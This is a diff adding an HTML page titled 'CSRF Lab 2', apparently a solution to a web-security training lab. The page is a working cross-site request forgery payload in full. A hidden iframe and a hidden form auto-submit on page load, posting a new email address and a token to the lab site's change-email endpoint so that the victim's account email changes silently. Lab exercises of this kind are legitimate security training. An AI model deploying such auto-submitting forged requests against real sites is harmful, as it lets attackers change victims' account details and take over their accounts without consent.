@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Lab 2</title>
+</head>
+<body>
+    <!-- iframe to hide form -->
+    <iframe name="hiden" style="display:none;"></iframe>
+    <form action="https://ac4f1f201e1ade81c0480ef0002100ee.web-security-academy.net/my-account/change-email" method="POST" id="csrf_lab2" target="hiden">
+        <input type="hidden" name="email" value="abdfghc@gmai.com">
+        <input type="hidden" name="csrf" value="PsS49ThAuMMlp18ahkj4l9gu5f999vEb">
+    </form>
+    <script>
+        document.getElementById('csrf_lab2').submit();
+    </script>
+</body>
+</html>
